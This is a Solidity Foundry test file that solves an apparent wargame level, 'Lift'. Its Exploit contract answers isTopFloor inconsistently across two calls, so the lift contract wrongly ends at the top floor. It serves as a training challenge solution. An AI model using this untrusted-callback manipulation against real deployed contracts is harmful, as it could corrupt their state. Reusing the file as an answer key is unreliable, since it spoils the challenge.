// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        Exploit exploitContract = new Exploit(instance);
        exploitContract.exploit();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Exploit is House {
    Lift public lift;
    bool toggle = false;

    constructor(Lift _lift) {
        lift = _lift;
    }

    function isTopFloor(uint256) external override returns (bool) {
        if (!toggle) {
            toggle = true;
            return false;
        }
        return true;
    }

    function exploit() public {
        lift.goToFloor(1);
    }
}
